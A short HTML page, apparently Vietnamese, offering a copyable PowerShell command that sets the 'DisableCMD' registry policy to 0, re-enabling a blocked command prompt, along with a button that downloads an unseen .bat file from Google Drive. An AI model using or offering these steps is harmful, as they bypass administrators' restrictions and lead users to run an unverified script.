<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Tải BAT từ GitHub</title>
  <style>
    body {
      background-color: #121212;
      color: #ffffff;
      font-family: Consolas, monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .path-box {
      background-color: #1e1e1e;
      padding: 12px 16px;
      border-radius: 6px;
      border: 1px solid #333;
      user-select: all;
      margin-bottom: 20px;
      max-width: 90%;
      text-align: center;
      word-wrap: break-word;
    }

    .download-btn {
      background-color: #2196F3;
      color: white;
      padding: 10px 18px;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }

    .download-btn:hover {
      background-color: #1976D2;
    }
  </style>
</head>
<body>
  <div class="path-box">C:\Windows\System32\WindowsPowerShell\v1.0\</div>
  <div class="path-box">Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name "DisableCMD" -Value 0</div>

  <a href="https://drive.usercontent.google.com/download?id=1e1CNS-eiHVZeoh9qOYlLAC1-gOJ8cXyc&export=download&authuser=0" download>
    <button class="download-btn">Tải file .bat</button>
  </a>
</body>
</html>
